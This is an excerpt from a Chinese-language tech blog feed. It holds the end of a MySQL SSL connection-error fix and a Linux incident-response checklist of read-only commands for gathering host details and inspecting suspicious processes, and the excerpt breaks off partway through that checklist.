    <content type="html"><![CDATA[<span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>对日常工作过程中遇到的mysql报错问题及解决方案汇总总结</p><h1 id="登录错误"><a href="#登录错误" class="headerlink" title="登录错误"></a>登录错误</h1><h2 id="unsupported-protocol"><a href="#unsupported-protocol" class="headerlink" title="unsupported protocol"></a>unsupported protocol</h2><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>终端中使用 mysql -h host -u name -p 命令连接mysql数据库，提示协议不支持</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit"><span class="hljs-keyword">ERROR </span>2026 (HY000): SSL connection error: error:0A000102:SSL routines::unsupported protocol<br></code></pre></td></tr></table></figure><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>增加–ssl-mode参数，忽略ssl认证</p><p>mysql -h host -u user -p –ssl-mode&#x3D;DISABLED</p><p>官方文档：</p><p><a href="https://dev.mysql.com/doc/refman/8.0/en/connection-options.html#option_general_ssl-mode">https://dev.mysql.com/doc/refman/8.0/en/connection-options.html#option_general_ssl-mode</a></p><h3 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h3><p>【1】mysql 客户端SSL错误2026 (HY000) tmaczt 2022-05-10 20:19:05</p><p>链接：<a href="https://blog.csdn.net/tmaczt/article/details/124696188">https://blog.csdn.net/tmaczt/article/details/124696188</a></p>]]></content>
    
    
    <categories>
      
      <category>db</category>
      
      <category>mysql</category>
      
      <category>mysql_error</category>
      
    </categories>
    
    
    <tags>
      
      <tag>db</tag>
      
      <tag>mysql</tag>
      
      <tag>mysql_error</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sec_response</title>
    <link href="/2024/03/12/security/secresponse/sec_response/"/>
    <url>/2024/03/12/security/secresponse/sec_response/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="主机信息收集"><a href="#主机信息收集" class="headerlink" title="主机信息收集"></a>主机信息收集</h2><h3 id="主机信息-hostnamectl"><a href="#主机信息-hostnamectl" class="headerlink" title="主机信息 hostnamectl"></a>主机信息 hostnamectl</h3><p>Static hostname ：主机名，来自&#x2F;etc&#x2F;hostname</p><p>Machine ID ：设备唯一标识</p><p>Virtualization：kvm 虚拟化，可以用来标记是否是虚拟机，物理机不存在该数据</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs nix">root@iZbp1191gh7vw52537lyxrZ:<span class="hljs-operator">/</span>tmp<span class="hljs-operator">/</span>test<span class="hljs-comment"># hostnamectl</span><br> Static <span class="hljs-params">hostname:</span> iZbp1191gh7vw52537lyxrZ<br> Pretty <span class="hljs-params">hostname:</span> aliyun<span class="hljs-comment">#@##@</span><br>       Icon <span class="hljs-params">name:</span> computer-vm<br>         <span class="hljs-params">Chassis:</span> vm<br>      Machine <span class="hljs-params">ID:</span> <span class="hljs-number">8</span>da0ace235c5435eb33ae56a538def68<br>         Boot <span class="hljs-params">ID:</span> <span class="hljs-number">5755</span>d1b8ae8c4e7cbe47b72434abc7ea<br>  <span class="hljs-params">Virtualization:</span> kvm<br>Operating <span class="hljs-params">System:</span> Ubuntu <span class="hljs-number">22.04</span>.<span class="hljs-number">2</span> LTS<br>          <span class="hljs-params">Kernel:</span> Linux <span class="hljs-number">5.15</span>.<span class="hljs-number">0</span><span class="hljs-operator">-</span><span class="hljs-number">7</span>3-generic<br>    <span class="hljs-params">Architecture:</span> x86-<span class="hljs-number">64</span><br> Hardware <span class="hljs-params">Vendor:</span> Alibaba Cloud<br>  Hardware <span class="hljs-params">Model:</span> Alibaba Cloud ECS<br></code></pre></td></tr></table></figure><h3 id="系统时间-date"><a href="#系统时间-date" class="headerlink" title="系统时间 date"></a>系统时间 date</h3><p>确认当前系统时间是否正确，为文件时间属性判断提供依据</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:/tmp/test</span><span class="hljs-comment"># date</span><br><span class="hljs-title class_">Wed</span> <span class="hljs-title class_">Mar</span> <span class="hljs-number">13</span> <span class="hljs-number">11</span><span class="hljs-symbol">:</span><span class="hljs-number">06</span><span class="hljs-symbol">:</span><span class="hljs-number">55</span> <span class="hljs-title class_">AM</span> <span class="hljs-title class_">CST</span> <span class="hljs-number">2024</span><br></code></pre></td></tr></table></figure><h3 id="系统开机运行时间"><a href="#系统开机运行时间" class="headerlink" title="系统开机运行时间"></a>系统开机运行时间</h3><h4 id="who-b-开机时间"><a href="#who-b-开机时间" class="headerlink" title="who -b 开机时间"></a>who -b 开机时间</h4><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:/tmp/test</span><span class="hljs-comment"># who -b</span><br>         system boot  <span class="hljs-number">2023</span><span class="hljs-number">-07</span><span class="hljs-number">-10</span> <span class="hljs-number">11</span><span class="hljs-symbol">:</span><span class="hljs-number">11</span><br></code></pre></td></tr></table></figure><h4 id="uptime-p-运行时长"><a href="#uptime-p-运行时长" class="headerlink" title="uptime -p 运行时长"></a>uptime -p 运行时长</h4><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:/tmp/test</span><span class="hljs-comment"># uptime -p</span><br>up <span class="hljs-number">35</span> weeks, <span class="hljs-number">2</span> days, <span class="hljs-number">3</span> minutes<br></code></pre></td></tr></table></figure><h3 id="系统版本信息"><a href="#系统版本信息" class="headerlink" title="系统版本信息"></a>系统版本信息</h3><h4 id="lsb-release-a"><a href="#lsb-release-a" class="headerlink" title="lsb_release -a"></a><strong>lsb_release -a</strong></h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/tmp/test# lsb_release<br><span class="hljs-attribute">LSB</span> Version:core-<span class="hljs-number">11</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>ubuntu4-noarch:security-<span class="hljs-number">11</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>ubuntu4-noarch<br><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/tmp/test# lsb_release -a<br><span class="hljs-attribute">LSB</span> Version:core-<span class="hljs-number">11</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>ubuntu4-noarch:security-<span class="hljs-number">11</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>ubuntu4-noarch<br><span class="hljs-attribute">Distributor</span> ID:Ubuntu<br><span class="hljs-attribute">Description</span>:Ubuntu <span class="hljs-number">22</span>.<span class="hljs-number">04</span>.<span class="hljs-number">2</span> LTS<br><span class="hljs-attribute">Release</span>:<span class="hljs-number">22</span>.<span class="hljs-number">04</span><br><span class="hljs-attribute">Codename</span>:jammy<br></code></pre></td></tr></table></figure><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nix">(base) [root@aliyun-<span class="hljs-number">39</span>_106_2_51 ~]<span class="hljs-comment"># lsb_release -a</span><br>LSB <span class="hljs-params">Version:</span><span class="hljs-meta">:core</span>-<span class="hljs-number">4</span>.<span class="hljs-number">1</span><span class="hljs-operator">-</span>amd64:core-<span class="hljs-number">4</span>.<span class="hljs-number">1</span><span class="hljs-operator">-</span>noarch<br>Distributor <span class="hljs-params">ID:</span>CentOS<br><span class="hljs-params">Description:</span>CentOS Linux release <span class="hljs-number">7.8</span>.<span class="hljs-number">2003</span> (Core)<br><span class="hljs-params">Release:</span><span class="hljs-number">7.8</span>.<span class="hljs-number">2003</span><br><span class="hljs-params">Codename:</span>Core<br></code></pre></td></tr></table></figure><h5 id="CentOS系列"><a href="#CentOS系列" class="headerlink" title="CentOS系列"></a>CentOS系列</h5><p><strong>cat &#x2F;etc&#x2F;redhat-release</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">(base) [root@110 cron.d]# <span class="hljs-built_in">cat</span> /etc/redhat-release<br>CentOS Linux release 7.9.2009 (Core)<br><br>centos6也可以查看 /etc/issue<br>[root@rdimtools1.ops.xlzbb1 /tmp]# <span class="hljs-built_in">cat</span> /etc/issue<br>CentOS release 6.5 (Final)<br>Kernel \r on an \m<br></code></pre></td></tr></table></figure><h3 id="内核版本-uname-a"><a href="#内核版本-uname-a" class="headerlink" title="内核版本 uname -a"></a>内核版本 uname -a</h3><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs llvm">ubuntu<span class="hljs-title">@VM-8-5-ubuntu</span>:~$ uname -a<br>Linux VM<span class="hljs-number">-8</span><span class="hljs-number">-5</span>-ubuntu <span class="hljs-number">5.4</span>.<span class="hljs-number">0</span><span class="hljs-number">-77</span>-generic <span class="hljs-variable">#86</span>-Ubuntu SMP Thu Jun <span class="hljs-number">17</span> <span class="hljs-number">02</span>:<span class="hljs-number">35</span>:<span class="hljs-number">03</span> UTC <span class="hljs-number">2021</span> <span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span> <span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span> <span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span> GNU/Linux<br><br>(base) [root<span class="hljs-title">@110</span> cron.d]# uname -a<br>Linux <span class="hljs-number">110</span> <span class="hljs-number">3.10</span>.<span class="hljs-number">0</span><span class="hljs-number">-693.2</span>.<span class="hljs-number">2</span>.el<span class="hljs-number">7</span>.<span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span> <span class="hljs-variable">#1</span> SMP Tue Sep <span class="hljs-number">12</span> <span class="hljs-number">22</span>:<span class="hljs-number">26</span>:<span class="hljs-number">13</span> UTC <span class="hljs-number">2017</span> <span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span> <span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span> <span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span> GNU/Linux<br><br>[root<span class="hljs-title">@rdimtools1.ops.xlzbb1</span> /tmp]# uname -a<br>Linux rdimtools<span class="hljs-number">1</span>.ops.xlzbb<span class="hljs-number">1</span>.node.com <span class="hljs-number">2.6</span>.<span class="hljs-number">32</span><span class="hljs-number">-431.11</span>.<span class="hljs-number">2</span>.el<span class="hljs-number">6</span>.toa.<span class="hljs-number">2</span>.<span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span> <span class="hljs-variable">#1</span> SMP Wed Apr <span class="hljs-number">9</span> <span class="hljs-number">15</span>:<span class="hljs-number">55</span>:<span class="hljs-number">33</span> CST <span class="hljs-number">2014</span> <span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span> <span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span> <span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span> GNU/Linux<br></code></pre></td></tr></table></figure><p>结果解释，如果只需要看内核版本，直接uname -r即可：</p><p>Linux 110 3.10.0-693.2.2.el7.x86_64 #1 SMP Tue Sep 12 22:26:13 UTC 2017 x86_64 x86_64 x86_64 GNU&#x2F;Linux</p><table><thead><tr><th>内核名称(-s)</th><th>主机名(-n)</th><th>内核(-r)</th><th>内核版本(-v)</th><th>硬件32位&#x2F;64位(-m)</th><th>处理器类型(-p)</th><th>硬件平台(-i)</th><th>操作系统(-o)</th></tr></thead><tbody><tr><td>Linux</td><td>110</td><td>3.10.0-693.2.2.el7.x86_64</td><td>#1 SMP Tue Sep 12 22:26:13 UTC 2017</td><td>x86_64</td><td>x86_64</td><td>x86_64</td><td>GNU&#x2F;Linux</td></tr></tbody></table><h3 id="主机名-hostname"><a href="#主机名-hostname" class="headerlink" title="主机名 hostname"></a>主机名 hostname</h3><p>cenots6：读取的是 &#x2F;etc&#x2F;sysconfig&#x2F;network 中的配置</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[root@rdimtools1.ops.xlzbb1 /tmp]</span><span class="hljs-comment"># cat /etc/sysconfig/network</span><br><span class="hljs-attr">NETWORKING</span>=<span class="hljs-literal">yes</span><br><span class="hljs-attr">HOSTNAME</span>=rdimtools1.ops.xlzbb1.node.com<br></code></pre></td></tr></table></figure><p>centos7,8&#x2F;ubuntu：读取的是 &#x2F;etc&#x2F;hostname中的值</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">(base) [root<span class="hljs-symbol">@110</span> cron.d]<span class="hljs-meta"># cat /etc/hostname</span><br><span class="hljs-number">110</span><br></code></pre></td></tr></table></figure><h2 id="止损"><a href="#止损" class="headerlink" title="止损"></a>止损</h2><h3 id="排查异常进程"><a href="#排查异常进程" class="headerlink" title="排查异常进程"></a>排查异常进程</h3><h4 id="检查高CPU进程"><a href="#检查高CPU进程" class="headerlink" title="检查高CPU进程"></a>检查高CPU进程</h4><h5 id="top-c-o-CPU"><a href="#top-c-o-CPU" class="headerlink" title="top -c -o +%CPU"></a>top -c -o +%CPU</h5><p>以CPU占比倒序</p><h5 id="ps-eo-pid-ppid-cpu-mem-cmd-–sort-cpu-head-n-5"><a href="#ps-eo-pid-ppid-cpu-mem-cmd-–sort-cpu-head-n-5" class="headerlink" title="ps -eo pid,ppid,%cpu,%mem,cmd –sort&#x3D;-%cpu | head -n 5"></a><strong>ps -eo pid,ppid,%cpu,%mem,cmd –sort&#x3D;-%cpu | head -n 5</strong></h5><p>ps查询进程，显示pid，ppid，cpu占比，内存占比，进程信息，以cpu占比倒序，只显示top5</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~# ps -eo pid,ppid,%cpu,%mem,cmd --sort=-%cpu | head -n <span class="hljs-number">5</span><br>    <span class="hljs-attribute">PID</span>    PPID %CPU %MEM CMD<br> <span class="hljs-attribute">442637</span>       <span class="hljs-number">1</span>  <span class="hljs-number">0</span>.<span class="hljs-number">7</span>  <span class="hljs-number">1</span>.<span class="hljs-number">5</span> /usr/local/aegis/aegis_client/aegis_11_83/AliYunDunMonitor<br> <span class="hljs-attribute">659535</span>       <span class="hljs-number">1</span>  <span class="hljs-number">0</span>.<span class="hljs-number">5</span> <span class="hljs-number">38</span>.<span class="hljs-number">8</span> /usr/sbin/mysqld<br>     <span class="hljs-attribute">92</span>       <span class="hljs-number">2</span>  <span class="hljs-number">0</span>.<span class="hljs-number">4</span>  <span class="hljs-number">0</span>.<span class="hljs-number">0</span><span class="hljs-meta"> [kswapd0]</span><br> <span class="hljs-attribute">442626</span>       <span class="hljs-number">1</span>  <span class="hljs-number">0</span>.<span class="hljs-number">4</span>  <span class="hljs-number">0</span>.<span class="hljs-number">7</span> /usr/local/aegis/aegis_client/aegis_11_83/AliYunDun<br></code></pre></td></tr></table></figure><h4 id="检查高内存进程"><a href="#检查高内存进程" class="headerlink" title="检查高内存进程"></a>检查高内存进程</h4><h5 id="top-c-o-MEM"><a href="#top-c-o-MEM" class="headerlink" title="top -c -o +%MEM"></a>top -c -o +%MEM</h5><p>以内存占比倒序</p><h5 id="ps-eo-pid-ppid-cpu-mem-cmd-–sort-mem-head-n-5"><a href="#ps-eo-pid-ppid-cpu-mem-cmd-–sort-mem-head-n-5" class="headerlink" title="ps -eo pid,ppid,%cpu,%mem,cmd –sort&#x3D;-%mem | head -n 5"></a>ps -eo pid,ppid,%cpu,%mem,cmd –sort&#x3D;-%mem | head -n 5</h5><p>ps查询进程，显示pid，ppid，cpu占比，内存占比，进程信息，以内存占比倒序，只显示top5</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~# ps -eo pid,ppid,%cpu,%mem,cmd --sort=-%mem | head -n <span class="hljs-number">5</span><br>    <span class="hljs-attribute">PID</span>    PPID %CPU %MEM CMD<br> <span class="hljs-attribute">659535</span>       <span class="hljs-number">1</span>  <span class="hljs-number">0</span>.<span class="hljs-number">5</span> <span class="hljs-number">38</span>.<span class="hljs-number">8</span> /usr/sbin/mysqld<br> <span class="hljs-attribute">577393</span>       <span class="hljs-number">1</span>  <span class="hljs-number">0</span>.<span class="hljs-number">0</span>  <span class="hljs-number">2</span>.<span class="hljs-number">9</span> /sbin/multipathd -d -s<br>  <span class="hljs-attribute">82956</span>       <span class="hljs-number">1</span>  <span class="hljs-number">0</span>.<span class="hljs-number">2</span>  <span class="hljs-number">2</span>.<span class="hljs-number">3</span> /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock<br> <span class="hljs-attribute">577430</span>       <span class="hljs-number">1</span>  <span class="hljs-number">0</span>.<span class="hljs-number">2</span>  <span class="hljs-number">1</span>.<span class="hljs-number">5</span> /usr/bin/containerd<br></code></pre></td></tr></table></figure><h4 id="检查高流量进程"><a href="#检查高流量进程" class="headerlink" title="检查高流量进程"></a>检查高流量进程</h4><p>需要额外命令 nethogs，可能更改某些文件时间属性，影响通过文件时间判断</p><h5 id="centos命令安装"><a href="#centos命令安装" class="headerlink" title="centos命令安装"></a>centos命令安装</h5><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmake">yum -y <span class="hljs-keyword">install</span> epel-release <br>yum -y <span class="hljs-keyword">install</span> nethogs<br></code></pre></td></tr></table></figure><h5 id="ubuntu命令安装"><a href="#ubuntu命令安装" class="headerlink" title="ubuntu命令安装"></a>ubuntu命令安装</h5><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">apt <span class="hljs-keyword">install</span> nethogs<br></code></pre></td></tr></table></figure><h5 id="进程检查"><a href="#进程检查" class="headerlink" title="进程检查"></a>进程检查</h5><p>管理员权限执行 nethogs，默认会以实时流量进行降序刷新</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dns">NetHogs version <span class="hljs-number">0.8.6-3</span><br><br>    PID USER     PROGRAM                                                                                            DEV         SENT      RECEIVED<br> <span class="hljs-number">676984</span> root     sshd: root@pts/<span class="hljs-number">0</span>                                                                                   eth0        <span class="hljs-number">0</span>.<span class="hljs-number">321</span>       <span class="hljs-number">0</span>.<span class="hljs-number">067</span> KB/sec<br>      ? root     <span class="hljs-number">172.16.24.136</span>:<span class="hljs-number">44765-89.248</span>.<span class="hljs-number">165.97:56284</span>                                                                        <span class="hljs-number">0</span>.<span class="hljs-number">011</span>       <span class="hljs-number">0</span>.<span class="hljs-number">023</span> KB/sec<br>      ? root     <span class="hljs-number">172.16.24.136</span>:<span class="hljs-number">8066-162.216</span>.<span class="hljs-number">149.193:50532</span>                                                                       <span class="hljs-number">0</span>.<span class="hljs-number">011</span>       <span class="hljs-number">0</span>.<span class="hljs-number">012</span> KB/sec<br>      ? root     <span class="hljs-number">172.16.24.136</span>:<span class="hljs-number">6000-205.210</span>.<span class="hljs-number">31.156:50132</span>                                                                        <span class="hljs-number">0</span>.<span class="hljs-number">000</span>       <span class="hljs-number">0</span>.<span class="hljs-number">000</span> KB/sec<br>      ? root     <span class="hljs-number">172.16.24.136</span>:<span class="hljs-number">3306-78.128</span>.<span class="hljs-number">114.102:50289</span>                                                                        <span class="hljs-number">0</span>.<span class="hljs-number">000</span>       <span class="hljs-number">0</span>.<span class="hljs-number">000</span> KB/sec<br>      ? root     <span class="hljs-number">172.16.24.136</span>:<span class="hljs-number">35487-31.6</span>.<span class="hljs-number">65.59:23619</span>                                                                           <span class="hljs-number">0</span>.<span class="hljs-number">000</span>       <span class="hljs-number">0</span>.<span class="hljs-number">000</span> KB/sec<br>      ? root     <span class="hljs-number">172.16.24.136</span>:<span class="hljs-number">55182-100.100</span>.<span class="hljs-number">154.78:80</span>                                                                          <span class="hljs-number">0</span>.<span class="hljs-number">000</span>       <span class="hljs-number">0</span>.<span class="hljs-number">000</span> KB/sec<br> <span class="hljs-number">671886</span> root     /usr/local/aegis/aegis_client/aegis_11_91/AliYunDun                                                eth0        <span class="hljs-number">0</span>.<span class="hljs-number">000</span>       <span class="hljs-number">0</span>.<span class="hljs-number">000</span> KB/sec<br>      ? root     unknown TCP                                                                                                    <span class="hljs-number">0</span>.<span class="hljs-number">000</span>       <span class="hljs-number">0</span>.<span class="hljs-number">000</span> KB/sec<br><br></code></pre></td></tr></table></figure><h4 id="确认进程id-pid"><a href="#确认进程id-pid" class="headerlink" title="确认进程id(pid)"></a>确认进程id(pid)</h4><h5 id="pidof-精确匹配-已知进程全名"><a href="#pidof-精确匹配-已知进程全名" class="headerlink" title="pidof-精确匹配-已知进程全名"></a>pidof-精确匹配-已知进程全名</h5><p>pidof “process name”</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs autoit">root<span class="hljs-symbol">@iZbp1191gh7vw52537lyxrZ</span>:~<span class="hljs-meta"># pidof <span class="hljs-string">&quot;/usr/sbin/mysqld&quot;</span></span><br><span class="hljs-number">659535</span><br>root<span class="hljs-symbol">@iZbp1191gh7vw52537lyxrZ</span>:~<span class="hljs-meta"># pidof <span class="hljs-string">&quot;mysqld&quot;</span></span><br><span class="hljs-number">659535</span><br></code></pre></td></tr></table></figure><h5 id="ps-pgrep-模糊匹配-已知进程部分名称"><a href="#ps-pgrep-模糊匹配-已知进程部分名称" class="headerlink" title="ps&#x2F;pgrep-模糊匹配-已知进程部分名称"></a>ps&#x2F;pgrep-模糊匹配-已知进程部分名称</h5><p>ps -ef | grep “process name” | grep -v grep | awk ‘{print $2}’</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">root@iZbp1191gh7vw52537lyxrZ:~# <span class="hljs-keyword">ps</span> -ef | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;my&quot;</span> | <span class="hljs-keyword">grep</span> -v <span class="hljs-keyword">grep</span> | awk <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span><br><span class="hljs-number">659535</span><br></code></pre></td></tr></table></figure><p>pgreap -f “process name”</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">root<span class="hljs-symbol">@iZbp1191gh7vw52537lyxrZ</span>:~<span class="hljs-meta"># pgrep -f <span class="hljs-string">&quot;my&quot;</span></span><br><span class="hljs-number">659535</span><br></code></pre></td></tr></table></figure><h5 id="排查进程详细内容"><a href="#排查进程详细内容" class="headerlink" title="排查进程详细内容"></a>排查进程详细内容</h5><h6 id="lsof-p-pid"><a href="#lsof-p-pid" class="headerlink" title="lsof -p pid"></a>lsof -p pid</h6><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~# lsof -p <span class="hljs-number">659535</span><br><span class="hljs-attribute">COMMAND</span>    PID  USER   FD      TYPE             DEVICE SIZE/<span class="hljs-literal">OFF</span>      NODE NAME<br><span class="hljs-attribute">mysqld</span>  <span class="hljs-number">659535</span> mysql  cwd       DIR              <span class="hljs-number">252</span>,<span class="hljs-number">3</span>     <span class="hljs-number">4096</span>    <span class="hljs-number">138978</span> /var/lib/mysql<br><span class="hljs-attribute">mysqld</span>  <span class="hljs-number">659535</span> mysql  rtd       DIR              <span class="hljs-number">252</span>,<span class="hljs-number">3</span>     <span class="hljs-number">4096</span>         <span class="hljs-number">2</span> /<br><span class="hljs-attribute">81920</span>    <span class="hljs-number">267788</span> /var/lib/mysql/#innodb_temp/temp_10.ibt<br><span class="hljs-attribute">mysqld</span>  <span class="hljs-number">659535</span> mysql   <span class="hljs-number">37</span>w      REG              <span class="hljs-number">252</span>,<span class="hljs-number">3</span>      <span class="hljs-number">157</span>    <span class="hljs-number">138921</span> /var/lib/mysql/binlog.<span class="hljs-number">000244</span><br><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~#<br></code></pre></td></tr></table></figure><h4 id="检查进程启动目录"><a href="#检查进程启动目录" class="headerlink" title="检查进程启动目录"></a>检查进程启动目录</h4><p>需要注意不一定是恶意文件目录</p><h5 id="pwdx-pid"><a href="#pwdx-pid" class="headerlink" title="pwdx pid"></a>pwdx pid</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby">root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># pwdx 659535</span><br><span class="hljs-number">659535</span>: <span class="hljs-regexp">/var/lib</span><span class="hljs-regexp">/mysql</span><br></code></pre></td></tr></table></figure><h4 id="检查进程实际启动文件"><a href="#检查进程实际启动文件" class="headerlink" title="检查进程实际启动文件"></a>检查进程实际启动文件</h4><p>查看到对应进程可执行文件的绝对路径</p><h5 id="ls-lat-proc-pid-exe"><a href="#ls-lat-proc-pid-exe" class="headerlink" title="ls -lat &#x2F;proc&#x2F;pid&#x2F;exe"></a>ls -lat &#x2F;proc&#x2F;pid&#x2F;exe</h5><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~# ls -lat /proc/<span class="hljs-number">659535</span>/exe<br><span class="hljs-attribute">lrwxrwxrwx</span> <span class="hljs-number">1</span> mysql mysql <span class="hljs-number">0</span> Mar <span class="hljs-number">11</span> <span class="hljs-number">09</span>:<span class="hljs-number">35</span> /proc/<span class="hljs-number">659535</span>/exe -&gt; /usr/sbin/mysqld<br></code></pre></td></tr></table></figure><h4 id="检查进程关联文件"><a href="#检查进程关联文件" class="headerlink" title="检查进程关联文件"></a>检查进程关联文件</h4><h5 id="cat-proc-pid-maps"><a href="#cat-proc-pid-maps" class="headerlink" title="cat &#x2F;proc&#x2F;pid&#x2F;maps"></a>cat &#x2F;proc&#x2F;pid&#x2F;maps</h5><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~# cat /proc/<span class="hljs-number">659535</span>/maps<br><span class="hljs-attribute">55f8c0537000</span>-<span class="hljs-number">55</span>f8c0df4000 r--p <span class="hljs-number">00000000</span> fc:<span class="hljs-number">03</span> <span class="hljs-number">797247</span>                     /usr/sbin/mysqld<br><span class="hljs-attribute">55f8c0df4000</span>-<span class="hljs-number">55</span>f8c2549000 r-xp <span class="hljs-number">008</span>bd000 fc:<span class="hljs-number">03</span> <span class="hljs-number">797247</span>                     /usr/sbin/mysqld<br><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~#<br></code></pre></td></tr></table></figure><h4 id="检查进程启动的所有线程"><a 